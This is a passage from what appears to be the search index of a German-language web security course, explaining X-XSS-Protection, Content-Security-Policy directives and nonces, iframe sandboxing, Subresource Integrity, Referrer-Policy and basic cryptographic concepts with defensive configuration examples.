werden.</p> </li> </ul>"},{"location":"client-side-attacks/xss/#hardening-mittels-x-xss-protection","title":"Hardening mittels X-XSS-Protection","text":"<p>Moderne Browser verwendeten Heuristiken um Reflected-XSS Angriffe automatisiert zu erkennen. Zumeist werden hierf\u00fcr die ausgehenden HTTP Requests (inkl. Parameter) mit den eingehenden Antwortdokumenten verglichen.</p> <p>Leider kann nicht davon ausgegangen werden, dass bei Browsern diese Heuristik per Default aktiviert oder deaktiviert ist \u2014 das Verhalten kann allerdings mittels des X-XSS-Protection-Header gesteuert werden. Es wird daher empfohlen, diesen Header zu setzen um undefiniertes Verhalten zu vermeiden.</p> <p>Folgende Werte sind f\u00fcr den Header erlaubt:</p> <ul> <li> <p>0: die XSS-Heuristik soll deaktiviert werden.</p> </li> <li> <p>1: die XSS-Heuristik soll aktiviert werden, erkannte potentielle   XSS-Schadmuster werden aus der Ausgabe entfernt.</p> </li> <li> <p>1;mode=block: die XSS-Heuristik soll aktiviert werden, falls   XSS-Schadmuster erkannt werden wird keine Webseite gerendert.</p> </li> </ul> <p>W\u00e4hrend das automatische Filtern von XSS-Schadcode theoretisch positiv aus Sicherheitssicht sein sollte, war dies in der Praxis fehlerbehaftet und f\u00fchrte zu folgenden Problemen:</p> <ul> <li> <p>False-Positives: nicht b\u00f6sartiger Schadcode wurde als Schadcode   erkannt und gefiltert. Dadurch wurde die Funktionsf\u00e4higkeit korrekt   programmierter Webseiten eingeschr\u00e4nkt.</p> </li> <li> <p>Wird X-XSS-Protection im Default-Modus verwendet, versucht der   Browser nur den Schadcode aus dem Antwortdokument zu filtern. Dies   kann gezielt durch Angreifer ausgenutzt werden, um auf diese Weise   XSS-Code zu generieren[6].</p> </li> </ul> <p>Aus diesem Grund ignorieren moderne Browser diesen Sicherheitsheader mittlerweile (Google Chrome, Mozilla Firefox und Microsoft Edge, Stand 31.12.2019). Als Gegenma\u00dfnahme gegen\u00fcber XSS kann daher nur der Einsatz von CSP empfohlen werden (abgesehen davon, XSS-L\u00fccken generell nicht zu implementieren).</p>"},{"location":"client-side-attacks/xss/#content-security-policy","title":"Content-Security-Policy","text":"<p>Die Content Security Policy kann verwendet werden um potentielle Javascript-L\u00fccken zu vermeiden. Hierbei wird durch eine Policy definiert in welchen Dateien \u00fcberhaupt Javascript-Code vorkommen darf. Falls eine saubere Trennung in JavaScript- und HTML-Dateien durchgef\u00fchrt wurde, kann die Definition von JavaScript-Fragmenten in HTML Dateien vollkommen deaktiviert werden. Falls es ein Angreifer nun schafft, durch eine Injection L\u00fccke JavaScript-Code in einer HTML-Seite zu platzieren, w\u00fcrde dieser durch den Browser einfach ignoriert werden.</p> <p>Ein Problem beim Einsatz von CSP sind polyglot Files. Dies sind Dateien, die so gebaut wurden, dass sie gleichzeitig zwei unterschiedliche Datentypen erf\u00fcllen. Ein Beispiel f\u00fcr ein polyglot File ist eine JPEG-Datei welche, wenn sie als Textdatei eingebunden wird, validen Javascript-Code beinhaltet. Ein Beispiel f\u00fcr solche Dateien kann unter https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs gefunden werden. Dies ist problematisch, da ein Angreifer ein JavaScript File als Bild hochladen kann (w\u00e4hrend der Upload von JavaScript-Files normalerweise durch eine Webapplikation blockiert wird) und danach mittels eines script-Tags dieses Bild als Javascript-Source File innerhalb von HTML inkludieren kann. Dies umgeht potentielle CSP-Richtlinien.</p>"},{"location":"client-side-hardening/allgemeines/","title":"Reflektionsfragen","text":"<ol> <li> <p>Was ist HTML Subresource Integrity (SRI), wie wird diese verwendet    und gegen welche Angriffe sch\u00fctzt diese Ma\u00dfnahme?</p> </li> <li> <p>Wie werden CSP verwendet? Gib ein Beispiel f\u00fcr CSPs? Wie    funktionieren script-src nonces?</p> </li> <li> <p>Was ist die Referrer-Policy und warum sollte diese verwendet werden?</p> </li> </ol> <p>[1] Achtung: w\u00e4hrend der Header aufgrund eines Rechtschreibfehlers Referer hei\u00dft, hei\u00dft der Policy Header Referrer-Policy.</p>"},{"location":"client-side-hardening/content-security-policy/","title":"Content-Security-Policy","text":"<p>Die Content-Security-Policy (CSP) erlaubt es, eine umfangreiche Policy von Webservern an Browser zu \u00fcbertragen. Prinzipiell sind mittels einer CSP viele der bereits erw\u00e4hnten Security-Header abbildbar.</p> <p>Die Content-Security-Policy kann entweder als HTTP-Header oder als Teil des HTML-Dokuments \u00fcbertragen werden. Der verwendete HTTP Header hei\u00dft Content-Security-Policy, bei Verwendung eines Meta-Tags w\u00fcrde der Code beispielsweise folgenderweise aussehen:</p> <pre><code>&lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; img-src https://*; child-src 'none';\"&gt;\n</code></pre> <p>Die grundlegende Funktionalit\u00e4t von CSP ist:</p> <ul> <li> <p>Definition von vertrauensw\u00fcrdigem Javascript bzw. Javascript-Sourcen</p> </li> <li> <p>Sicherstellen, dass Seitenelemente (CSS, Bilder, etc.) nur aus   vertrauensw\u00fcrden Quellen bezogen werden.</p> </li> <li> <p>Definition der Interaktion mit externen Seiten (z.B. mittels   iFrames)</p> </li> <li> <p>Sonstiges: Erh\u00f6hung der Verbindungssicherheit, etc.</p> </li> </ul>"},{"location":"client-side-hardening/content-security-policy/#trennung-von-html-und-javascript-code","title":"Trennung von HTML und JavaScript-Code","text":"<p>Mittels CSP wird zumeist definiert aus welchen Quellen Javascript-Code geladen werden darf. Damit dadurch ein gutes Sicherheitsniveau erreicht werden kann, ist eine Trennung vom JavaScript-Code von den verwendeten HTML-Dateien notwendig. Falls Javascript innerhalb von HTML Dateien erlaubt ist, kann schwer unterschieden werden ob vorgefundener JavaScript-Code von der Applikation vorgesehen oder durch einen Angreifer eingeschleust worden ist.</p> <p>Diese Trennung wird erreicht, wenn der gesamte JavaScript-Code in getrennten JS-Dateien bereitgestellt wird. Dieser wird in die HTML-Seite mittels einem script-Tag eingebunden:</p> <pre><code>&lt;script src=\"externalfile.js\"&gt;&lt;/script&gt;\n</code></pre> <p>In externalfile.js wird nun der JavaScript-Code hinterlegt. Da a-priori keine Verbindung zwischen dem JavaScript-Code und dem HTML-File besteht, wird zumeist der $(document).ready-Callback verwendet. Code in diesem Callback wird ausgef\u00fchrt, sobald das DOM fertig geladen wurde:</p> <pre><code>$(document).ready(function()  {\n    // binden des JavaScript-Codes an etwaige Elemente\n    document.getElementById(\"btn\").addEventListener('click', doSomething);\n\n    // other Javascript code\n});\n</code></pre> <p>Bei diesem Beispiel wird nun durch die Methode addEventListener die JavaScript-Methode doSomething beim Klicken auf den Button mit der Id btn aufgerufen.</p>"},{"location":"client-side-hardening/content-security-policy/#verfugbare-csp-elemente","title":"Verf\u00fcgbare CSP-Elemente","text":"<p>CSP besteht aus mehreren Direktiven, die folgende Tabelle gibt eine kurze \u00dcbersicht der M\u00f6glichkeiten:</p> Name Beschreibung default-src definiert die default Policy zum Laden von remote Elementen f\u00fcr die meisten Elemente. script-src definiert vertrauensw\u00fcrde Quellen f\u00fcr geladene JavaScript Dateien. style-src definiert vertrauensw\u00fcrde Quellen f\u00fcr geladene CSS-Dateien. plugin-types object-src: definiert erlaubte Plugin Typen und deren vertrauensw\u00fcrde Sourcen img-src, media-src, font-src definiert vertrauensw\u00fcrdige Quellen f\u00fcr die jeweiligen Dateitypen child-src (ehem. frame-src) definiert erlaubte Quellen f\u00fcr den Inhalt verwendeter Iframes. sandbox aktiviert eine Sandbox f\u00fcr die aktuelle Resource \u00e4hnlich wie die Sandbox eines eingebetteten Iframas. Durch Optionen kann die Sandbox aufgeweicht werden. connect-src Wird von JSONP, WebSockets und EventSource verwendet. form-action welche URIs d\u00fcrfen als Ziel eines Formulars dienen reflected-xss entspricht X-XSS-Protection frame-ancestors definiert, welche externen Seiten die Resource im Zuge eines Iframes verwenden d\u00fcrfen, entspricht ca. einem X-Frame-Options. referrer \u00e4hnlich wie Referrer-Header report-uri CSP erlaubt die Angabe einer Reporting-URL. Im Fehlerfall wird an diese URL eine detaillierte Fehlermeldung reported. block-all-mixed-content upgrade-insecure-requests <p>Alle Direktiven die mit -src enden erlauben die Verwendung \u00e4hnlicher Source-Werte, die folgende Tabelle gibt ein paar Beispiele. Durch die Verwendung von \u201cunsafe-inline\u201d wird die Trennung zwischen HTML und JavaScript nicht mehr erzwungen und daher der Gro\u00dfteils des XSS-Schutzes neutralisiert. Diese Direktive sollte daher soweit wie m\u00f6glich vermieden werden.</p> Name Beschreibung * erlaubt alle URIs ausgenommen data:, blob: und filesystem: \u2019none\u2019 verbietet das Laden von Ressourcen. \u2019self\u2019 erlaubt das Laden von Ressourcen vom eigenen Origin data: erlaubt das Bereitstellen von Ressourcen \u00fcber data (base64-codierte Daten). domain erlaubt das Laden von Daten von der entsprechenden Domain. Wildcards f\u00fcr Subdomains d\u00fcrfen verwendet werden. Wird der Domainname mit https:// begonnen, muss HTTPS beim Zugriff verwendet werden https erzwingt das Laden von Ressourcen \u00fcber HTTPS, alle Domains sind erlaubt. \u2019unsafe-inline\u2019 erlaubt inline Javascript als auch javascript: URIs \u2019unsafe-eval\u2019 erlaubt unsichere dynamische Code-Exekution mittels eval. \u2019nonce-(nonce) script- oder style-Tags werden exekutiert sofern diese ein nonce-Attribut besitzen welches ident zu dem Wert innerhalb des CSP ist. sha256-(hash) Erlaubt die Exekution von Skripts sofern ihr Hash dem in der CSP angegeben Hash entsprechen."},{"location":"client-side-hardening/content-security-policy/#csp-nonces","title":"CSP-Nonces","text":"<p>CSP-Nonces erlauben die Integration von CSP ohne die gesamte Web-Applikation nach dem Grundsatz der strikten Trennung von JavaScript und HTML entwickelt zu haben. Dieses System basiert darauf, dass innerhalb des CSP-Headers eine Nonce (zuf\u00e4llige einmalige Zahl) definiert wird und innerhalb der HTML Datei nur Script- und Style-Elemente nur exekutiert werden, wenn diese einen identen Wert als nonce-Attribut gesetzt haben.</p> <p>Wird zum Beispiel folgender CSP-Header verwendet:</p> <pre><code>Content-Security-Policy: script-src 'nonce-2726c7f26c'\n</code></pre> <p>w\u00fcrde das Skript nur exekutiert werden, wenn es die idente nonce (2726c7f26c) innerhalb des script-Tags verwendet:</p> <pre><code>&lt;script nonce=\"2726c7f26c\"&gt;\n  var inline = 1;\n&lt;/script&gt;\n</code></pre> <p>Die Sicherheit dieses Verfahrens ist von zwei Annahmen abh\u00e4ngig:</p> <ol> <li> <p>Der Angreifer darf die nonce nicht vorherbestimmten k\u00f6nnen. Ebenso    muss bei jedem Seitenaufruf eine neue nonce generiert werden.</p> </li> <li> <p>Der Angreifer darf nicht die M\u00f6glichkeit besitzen, innerhalb eines    sicheren Skript-Aufrufs (bei dem die richtige nonce gesetzt ist)    b\u00f6sartigen JavaScript-Code einzuf\u00fcgen.</p> </li> </ol>"},{"location":"client-side-hardening/content-security-policy/#csp-beispiele","title":"CSP-Beispiele","text":"<p>Ein einfaches Beispiel, welches das Laden von Ressourcen (Javascript, CSS, Images) nur vom eigenen Server erlaubt:</p> <pre><code>Content-Security-Policy: default-src 'self'\n</code></pre> <p>Folgendes Beispiel schr\u00e4nkt m\u00f6gliche Angriffsvektoren bereits stark ein:</p> <pre><code>Content-Security-Policy:\n  object-src 'none';\n  script-src 'nonce-{random}' 'unsafe-inline' 'strict-dynamic' https: http:;\n  base-uri 'none';\n</code></pre> <p>Folgende Einstellungen werden dadurch an den Browser \u00fcbermittelt:</p> <ul> <li>object-src: none verhindert das Laden von Plugins wie z.B. Flash.</li> <li> <p>Die verwendete script-src Line verwendet \u201cneues\u201d als auch \u201caltes\u201d   CSP damit unterschiedliche Browserversionen sichere CSP   Einstellungen bekommen. Die Kombination von nonce und   unsafe-inline bewirkt bei neueren Browsern, dass script-Tags nur   verwendet werden, wenn die angegebene Nonce bei dem Skript-Tag als   Attribut hinterlegt ist. Neuere Browser ignorieren in dem Fall   unsafe-inline. \u00c4ltere Browser ignorieren die Nonce, \u00fcber   unsafe-inline werden allerdings \u201cnormale\u201d script-Tags erlaubt.   strict-dynamic erlaubt das Laden von remote JavaScript-Dateien   ausgehend von trusted Scripts. Moderne Browser ignorieren die   zus\u00e4tzlichen Schemas (http und https), w\u00e4hrend \u00e4ltere Browser die   kein strict-dynamic erkennen durch die Schemas externe   JavaScript-Dateien laden k\u00f6nnen.</p> </li> <li> <p>base-uri: none deaktiviert das HTML base-Element welches im   Zusammenhang mit relativen Imports verwendet werden kann, um   Injection-Angriffe durchzuf\u00fchren.</p> </li> </ul>"},{"location":"client-side-hardening/integration-externer-komponenten/","title":"Integration externer Komponenten","text":"<p>Werden externe Inhalte innerhalb der eigenen Seite inkludiert, erh\u00f6ht sich die Angriffsfl\u00e4che: ein Angreifer mit Zugriff auf die externe Seite kann \u00fcber diese Schadcode in die, eigentlich sichere, eigene Webseite einschleusen. Falls die Einbindung externer Inhalte zwingend ben\u00f6tigt wird, kann das Gefahrenpotential durch Einsatz folgender Techniken reduziert werden:</p>"},{"location":"client-side-hardening/integration-externer-komponenten/#iframe-sandbox-flag","title":"IFrame: sandbox-Flag","text":"<p>Wird eine externe Resource \u00fcber das HTML iframe Tag eingebunden kann durch Verwendung des sandbox-Attributes die Sicherheit erh\u00f6ht werden. Bei Verwendung dieses Attributes werden folgende Einschr\u00e4nkungen aktiviert:</p> <ul> <li> <p>JavaScript wird f\u00fcr die eingebundene Resource deaktiviert.</p> </li> <li> <p>Die eingebundene Seite bekommt einen eigenen Origin; dadurch kann   dieses nicht mehr auf die einbindende Seite zugreifen, auch wenn   diese auf dem identen Server abgelegt waren.</p> </li> <li> <p>Die eingebundene Seite kann keine neuen Fenster bzw. Dialoge \u00f6ffnen.</p> </li> <li> <p>Es k\u00f6nnen keine Formulare abgeschickt werden.</p> </li> <li> <p>Plugins werden f\u00fcr die eingebettete Seite deaktiviert.</p> </li> <li> <p>Autoplay wird deaktiviert.</p> </li> </ul> <p>Die Einschr\u00e4nkungen k\u00f6nnen durch mehrere Optionen aufgeweicht werden, der Namen dieser Optionen beginnt mit allow-. Ein abschlie\u00dfendes Beispiel f\u00fcr einen per Iframe eingebundenen Twitter-Button:</p> <pre><code>&lt;iframe sandbox=\"allow-same-origin allow-scripts allow-popups allow-forms\"\nsrc=\"https://platform.twitter.com/widgets/tweet_button.html\"\nstyle=\"border: 0; width:130px; height:20px;\"\n&lt;/iframe&gt;\n</code></pre>"},{"location":"client-side-hardening/integration-externer-komponenten/#subresource-integrity-sri","title":"Subresource Integrity (SRI)","text":"<p>Webapplikationen lagern statische Dateien h\u00e4ufig auf externe Server aus. Ein Beispiel hierf\u00fcr w\u00e4re z.B. das Auslagern von statische Javascript- oder CSS-Dateien auf ein CDN-Netzwerk. Dies wird zumeist zur Erh\u00f6hung der Performance bzw. Reduktion der Latenzzeit durchgef\u00fchrt.</p> <p>Ein Angreifer, der Zugriff auf einen externen Server erlangt, kann auf diesen b\u00f6sartigen JavaScript- oder CSS-Code hinterlegen. L\u00e4dt nun eine Webseite diese Dateien, wird diese automatisch infiziert. Um diesen Angriffsvektor zu vermeiden, kann Subresource Integrity verwendet werden. Bei dieser Technik wird ein Hashwert f\u00fcr jede eingebundene Resource berechnet und innerhalb der eigenen Webseite angegeben. Wird nun eine externe Resource angefordert, berechnet der Webbrowser den Hashwert der empfangenen Resource und vergleicht diesen mit dem konfigurierten Hashwert (innerhalb der Webseite). Die Resource wird nur verwendet, wenn diese Hashwerte ident sind.</p> <p>Ein Beispiel:</p> <pre><code>&lt;script src=\"https://example.com/example-framework.js\"\nintegrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"\ncrossorigin=\"anonymous\"&gt;\n&lt;/script&gt;\n``  `\n\nMittels CSP kann die Verwendung von Subresource Integrity erzwungen\nwerden, folgendes Beispiel erzwingt die Angabe von Hashsummen f\u00fcr alle\ninkludierte JavaScript- und CSS-Dateien.\n\n```http\nContent-Security-Policy: require-sri-for script style;\n</code></pre>"},{"location":"client-side-hardening/referer-policy/","title":"Referrer-Policy","text":"<p>Ein Standard-Header der von Webbrowsern gesetzt wird ist der Referer-Header. Dieser inkludiert bei jedem Seitenaufruf die URL der aufrufenden Seite. Dies kann einen negativen Security-Impact haben, falls die URL der aufrufenden Seite sensible Informationen (wie z.B. eine Session-Id oder auch sensible Benutzerdaten) beinhaltet. Potentiell wird der Header vom Empfangsserver und, bei unverschl\u00fcsselter Kommunikation, von allen verbundenen Ger\u00e4ten entlang des Kommunikationspfades gesehen.</p> <p>Web-Server k\u00f6nnen das gew\u00fcnschte Verhalten durch Verwendung des Headers Referrer-Policy[1] mitteilen, valide Werte sind:</p> <ul> <li>no-referrer: der Referer-Header wird nicht \u00fcbertragen.</li> <li>no-referrer-when-downgrade: die URL wird als Referer \u00fcbertragen sofern die Folgeseite nicht ein unsichereres Protokoll verwendet. Dadurch wird z.B. eine \u00dcbertragung der URL beim \u00dcbergang von HTTPS zu HTTP verboten. Dies ist h\u00e4ufig das Default-Verhalten der Webbrowser.</li> <li>origin: es wird immer nur der Origin \u00fcbertragen.</li> <li>origin-when-cross-origin: es wird die volle URL \u00fcbertragen, sofern man sich innerhalb des identen Origins befindet. Falls es zu einem Origin-Wechsel kommt (z.B. durch Navigation auf eine externe Seite) wird nur der Origin \u00fcbertragen.</li> <li>same-origin: solange man sich innerhalb des Origins befindet, wird die URL gesetzt, ansonsten wird kein Referer-Header versendet.</li> <li>strict-origin: es wird immer nur der Origin als Referer versendet, und dies auch nur falls das Sicherheitslevel ident ist (es wird also beim \u00dcbergang von einer HTTPS auf eine HTTP Seite kein Referer gesetzt).</li> <li>strict-origin-when-cross-origin: es wird die volle URL innerhalb des identen Origin verwendet, wird auf Webseiten mit unterschiedlichen Origin zugegriffen (also z.B. beim \u00dcbergang auf externe Webseiten) wird nur der Origin als Referer verwendet. Falls die Sicherheit der Kommunikation schlechter wird (also z.B. beim \u00dcbergang von HTTPS auf HTTP) wird \u00fcberhaupt kein Referer-Header versendet.</li> <li>unsafe-url: die gesamte URL wird im Referrer-Header immer \u00fcbertragen.</li> </ul> <p>Es wird empfohlen, eine Referrer-Policy zu w\u00e4hlen, die nicht no-referrer-when-downgrade bzw. unsafe-url ist.</p>"},{"location":"introduction/crypto_basics/","title":"Kryptographische Grundlagen","text":"<p>Kryptographie beschreibt die Technik (und Kunst) \u00fcber nicht-vertrauensw\u00fcrdige Kan\u00e4le bzw. Speicherorte Daten integrit\u00e4ts- und vertraulichkeitsgesichert zu \u00fcbertragen. Dadurch kann Kryptographie als Mittel gegen spoofing, tampering, repudiation und information disclosure dienen. Dieses Kapitel soll eine (extrem) kurze Einf\u00fchrung in die, in diesem Dokument, verwendeten Konzepte geben.</p> <p>Bei der Verschl\u00fcsselung wird der urspr\u00fcngliche Text (h\u00e4ufig plaintext genannt) durch den Algorithmus in einen neuen, verschl\u00fcsselten, Text (h\u00e4ufig ciphertext genannt) konvertiert. Dieser Ciphertext kann durch die Entschl\u00fcsselung wieder in den Plaintext zur\u00fcck verwandelt werden. Die hierbei verwendeten Algorithmen werden h\u00e4ufig Cipher genannt. In der Literatur werden die dabei beteiligten Partein meistens ident benannt: Alice und Bob sind die beiden Parteien die miteinander sicher kommunizieren wollen. Eve ist ein Angreifer, der diese Nachrichten abh\u00f6ren, aber nicht modifizieren kann; Mallory ist ein Angreifer, der auch aktiv angreifen darf.</p> <p>Grundlegend sollten folgende Grunds\u00e4tze bei der Verwendung von Kryptographie beachtet werden:</p> <ul> <li> <p>Niemals selbst ein kryptographisches System entwerfen, sondern immer   ein etabliertes (und getestetes) System verwenden.</p> </li> <li> <p>Niemals selbst einen kryptographischen Algorithmus/Bibliothek   implementieren, sondern immer etablierte und getestet Komponenten   verwenden.</p> </li> <li> <p>Die richtige kryptographische Methode w\u00e4hlen.</p> </li> <li> <p>Immer davon ausgehen, dass der eigene Source Code fr\u00fcher oder sp\u00e4ter   \u00f6ffentlich wird. Aus diesem Grund darf ein kryptographischer   Schl\u00fcssel (oder auch Credentials) niemals Teil des Source Codes   werden.</p> </li> <li> <p>Essentiell zur sicheren Verwendung der verschiedenen   kryptographischen Methoden sind die dabei verwendeten Sch\u00fcssel.   Diese m\u00fcssen sowohl sicher gespeichert als auch transportiert   werden. Noch komplexer ist das Herstellen eines Vertrauensverh\u00e4ltnis   (Trust) zwischen den jeweiligen Kommunikationspartnern: woher weiss   ein Partner, dass ein vorhandener Schl\u00fcssel eines anderen   Kommunikationsparters vertrauensw\u00fcrdig ist? Key Management ist   komplex und sollte nicht untersch\u00e4tzt werden!</p> </li> </ul> <p>Jede implementierte und konfigurierbare kryptographische Methode erh\u00f6ht potentiell die Angriffsoberfl\u00e4che. Ein Beispiel hierf\u00fcr ist z. B. die OpenSSL-Bibliothek die dutzende Algorithmen implementiert. Als Alternative sind in den letzten Jahren kryptographische Bibliotheken wie NaCl (\u201csalt\u201d) entstanden, die f\u00fcr jede kryptographische Methode genau eine sichere Implementierung anbieten. Auf diese Weise sollen Selektionsfehler durch Entwickler vermieden werden.</p> <p>Ein h\u00e4ufiger verwendeter Begriff ist Rubber Hose Cryptography. Ein noch so technisch sicheres kryptographisches System kann durch bezahlte Schl\u00e4ger mit einem Gummischlauch und der Androhung von Gewalt, falls das Opfer nicht den privaten Schl\u00fcssel mitteilt, g\u00fcnstig gebrochen werden. Anstatt durch Androhung von Gewalt kann Rubber Hose Cryptography auch auf andere Aspekte eines Schl\u00fcsseltr\u00e4gers abzielen: Geld, Ideologie, Coersion oder Ego (Sex sells).</p>"},{"location":"introduction/crypto_basics/#verschlusselung","title":"Verschl\u00fcsselung","text":"<p>Zur Wahrung der Vertraulichkeit von Daten wird Verschl\u00fcsselung eingesetzt. Bei dieser wird der Originaltext (engl. plaintext) in einen verschl\u00fcsselten Text (engl. ciphertext) konvertiert. Dieser kann wieder durch den Entschl\u00fcsselungs-Vorgang in den Originaltext zur\u00fcck verwandelt werden. Verschl\u00fcsselungsalgorithmen k\u00f6nnen in zwei Familien eingeteilt werden: symmetrisch und asymmetrisch (auch public-key encryption genannt). Bei symmetrischer Verschl\u00fcsselung wird zum ver- und entschl\u00fcsseln der idente Schl\u00fcssel verwendet. Problematisch hierbei ist, dass dieser geteilte geheime Schl\u00fcssel initial zwischen allen Beteiligten verteilt werden muss. Bei der asymmetrischen Verschl\u00fcsselung wird statt einem geteilten Schl\u00fcssel ein Schl\u00fcsselpaar[1] verwendet. Dieses besteht aus einem \u00f6ffentlichen Schl\u00fcssel der zur Verschl\u00fcsselung dient und einem zugeh\u00f6rigen privaten Schl\u00fcssel der zum Entschl\u00fcsseln verwendet wird. Dadurch wird die Problematik des initialen Schl\u00fcsselverteilens entsch\u00e4rft, da nur \u00f6ffentliche Schl\u00fcssel verteilt werden m\u00fcssen (diese d\u00fcrfen ver\u00f6ffentlicht bzw. verloren werden). Ein Nachteil asymmetrischer Verschl\u00fcsselung gegen\u00fcber symmetrischer Verschl\u00fcsselung ist, dass sie langsamer als symmetrische Verschl\u00fcsselung ist.</p>"},{"location":"introduction/crypto_basics/#block-und-stream-cipher","title":"Block- und Stream-Cipher","text":"<p>Eine weitere Unterscheidungsm\u00f6glichkeit f\u00fcr Verschl\u00fcsselungsalgorithmen ist die in block und stream ciphers. Bei Blockciphern werden zuerst Daten angeh\u00e4uft (\u201cein Block\u201d an plain-data) und dann dieser Block verschl\u00fcsselt. Bei einem Streamcipher wird jedes Zeichen sofort verschl\u00fcsselt, das Sammeln von Blocken wird so vermieden. W\u00e4hrend Stream-Ciphers teilweise einfacher f\u00fcr Programmierer in ihrer Verwendung sind, werden aus Effizienzgr\u00fcnden fast ausschlie\u00dflich Blockcipher verwendet. Werden zwei idente Bl\u00f6cke mit dem identen Schl\u00fcssel verschl\u00fcsselt, w\u00fcrden idente verschl\u00fcsselte Bl\u00f6cke entstehen. Dies erlaubt es einem Angreifer, strukturelle Informationen aus verschl\u00fcsselten Dokumenten zu extrahieren. Um dies zu vermeiden werden so genannte Block Modes verwendet um sicherzustellen, dass idente plain-text Bl\u00f6cke unterschiedliche cipher-text Bl\u00f6cke produzieren. Bei Auswahl des Block Modes sollten GCM-Modes (bzw. AEAD-Varianten) bevorzugt und ECB bzw. CBC Modes vermieden werden.</p>"},{"location":"introduction/crypto_basics/#integritatsschutz","title":"Integrit\u00e4tsschutz","text":"<p>Verschl\u00fcsselung gew\u00e4hrleistet nicht automatisch die Integrit\u00e4t der verschl\u00fcsselten Daten. Hierf\u00fcr m\u00fcssen eigene Algorithmen verwendet werden. H\u00e4ufig vorgefunden werden Hashes, Message Authentication Codes (MACs) und Signaturen. Vereinfacht ausgedruckt berechnen Hashes ausgehend von beliebig langen Eingangsdaten eine Checksumme konstanter Gr\u00f6\u00dfe. Wird ein Hash auf identen Eingangsdaten angewandt, wird auch ein identer Hash berechnet. Ein Hash ist eine Einwegfunktion: w\u00e4hrend der zugeh\u00f6rige Hash zu einem Eingangsdatum schnell berechnet werden kann (gegeben den urspr\u00fcnglichen Daten), ist das Berechnen der Eingangsdaten ausgehend von einem Hash realistisch nicht m\u00f6glich.</p> <p>Bei einem Message Authentication Code (MAC) wird der Hash um ein geheimes geteiltes Passwort erweitert. Zur Berechnung bzw. Validierung eines MACs wird dieses Passwort ben\u00f6tigt. Analog zur symmetrischen Verschl\u00fcsselung ergibt sich hier die Problematik der Schl\u00fcsselverteilung. Signaturen l\u00f6sen dieses Problem indem sie asymmetrische (public-key) Verschl\u00fcsselung einsetzen. Bei ihnen kann die Checksumme (Signature) mit Hilfe des privaten Schl\u00fcssels erstellt und mit Hilfe des \u00f6ffentlichen Schl\u00fcssels verifiziert werden. Dadurch entf\u00e4llt das Problem der Schl\u00fcsselverteilung, allerdings wird auch hier der Vorteil durch geringere Geschwindigkeit erkauft.</p> <p>Je nach Einsatzbereich muss nun ein geeignetes Verfahren zur Integrit\u00e4tssicherung und Verschl\u00fcsselung gew\u00e4hlt werden. Werden Daten \u00fcber ein \u00f6ffentliches bzw. feindliches Netzwerk transferiert ist z. B. der Einsatz eines Hashes problematisch. Falls ein Angreifer einen Datensatz abfangen und modifizieren kann, kann er ebenso einen neuen Hash berechnen und so den Integrit\u00e4tsschutz umgehen. Bei diesem Beispiel w\u00e4re der Einsatz eines MACs oder von Signaturen sinnvoller.</p>"},{"location":"introduction/crypto_basics/#zufallszahlen","title":"Zufallszahlen","text":"<p>Bei der korrekten Verwendung von kryptographischen Methoden ist der Einsatz guter Zufallszahlengenerator essentiell. Dieser sollte Zufallszahlen mit hoher Entropie generieren. Dies kann z. B. durch Einsatz eines Hardware-Zufallsgenerators sichergestellt werden. Ist ein solcher nicht verf\u00fcgbar, muss ein kryptographisch sicherer Pseudo-Zufallszahlengenerator (PRNG) verwendet werden. Moderne Betriebssysteme bieten zumeist hybride L\u00f6sungen an: hierbei werden zwar PRNGs verwendet, diese allerdings mit Entropie aus weiteren Quelle[2] angereichert.</p> <p>Die Qualit\u00e4t der generierten Zufallszahlen kann \u00fcber deren Entropie bestimmt werden. Hierbei wird \u00fcber statistische Methoden die Qualit\u00e4t der Zuf\u00e4lligkeit der generierten Karten ermittelt.</p>"},{"location":"introduction/crypto_basics/#weitere-informationsquellen","title":"Weitere Informationsquellen","text":"<p>Entwickler ben\u00f6tigen Guidance zur Selektion der jeweiligen kryptographischen Algorithmen, hier eine kleine Auswahl \u00f6ffentlich verf\u00fcgbarer Dokumente:</p> <ol> <li> <p>Das amerikanische NIST gibt Empfehlungen f\u00fcr Cryptographical    Standards ab, z. B. SP-800-175B. Aufgrund der Zusammenarbeit des    NIST mit der amerikanischen NSA bei zu vorigen Crypto-Standards    (Vermutung der Platzierung einer Backdoor in einen    Random-Number-Generator) wird mittlerweile gerne von den    NIST-Empfehlungen abgesehen.</p> </li> <li> <p>Die europ\u00e4ische ENISA gibt regelm\u00e4\u00dfig Empfehlungen zu verwendeten    kryptographischen Standards und Schl\u00fcssell\u00e4ngen ab (Algorithms, key    size and parameter report 2014). W\u00e4hrend diese relativ gut sind,    ist die Frequenz der Ver\u00f6ffentlichung f\u00fcr IT-Verh\u00e4ltnisse etwas    beh\u00e4big (4-5 Jahre).</p> </li> <li> <p>Das deutsche Bundesamt f\u00fcr Sicherheit in der Informationstechnik    (BSI) bietet h\u00e4ufig \u00fcberarbeitete Empfehlungen zum Einsatz    kryptographischer Methoden an (BSI TR-02102). Diese sind relativ    aktuell und klassifizieren Algorithmen in sichere Algorithmen die    bei aktuellen Neuentwicklungen verwendet werden sollen und in    legacy-Algorithmen, die zwar nicht mehr bei Neuentwicklungen    verwendet werden sollten, die aber bei bestehender Software durchaus    weiterverwendet werden k\u00f6nnen.</p> </li> <li> <p>BetterCrypto.org bietet regelm\u00e4\u00dfig upgedatete    Beispielskonfigurationen f\u00fcr gel\u00e4ufige Webserver. Diese sollten dazu    dienen, dass ein Administrator diese Snippets direkt in die    Konfiguration eines Webservers kopieren k\u00f6nnen und dadurch eine    sichere Konfiguration erreicht wird.</p> </li> </ol>"},{"location":"introduction/crypto_basics/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Welche Grundideen sollten bei dem Entwurf und Einsatz    kryptographischer Methoden angewandt werden?</p> </li> <li> <p>Wann sollte ein MAC verwendet werden? Stelle diesen einem Hash oder    einer kryptographsichen Signatur gegen\u00fcber.</p> </li> </ol> <p>[1] Das Schl\u00fcsselpaar ist mathematisch \u201cverwandt\u201d.</p> <p>[2] Z. B. aus CPU-Zufallszahlengeneratoren, etc.</p>"},{"location":"introduction/integration/","title":"Integration mit der Umgebung","text":"<p>Eine Webapplikation sollte niemals isoliert betrachtet werden. Auch wenn die vorgestellten Komponenten perfekt umgesetzt werden, ergibt sich aus der Interaktion zwischen der theoretischen Webapplikation und der realen Umgebung immer ein Gefahren- 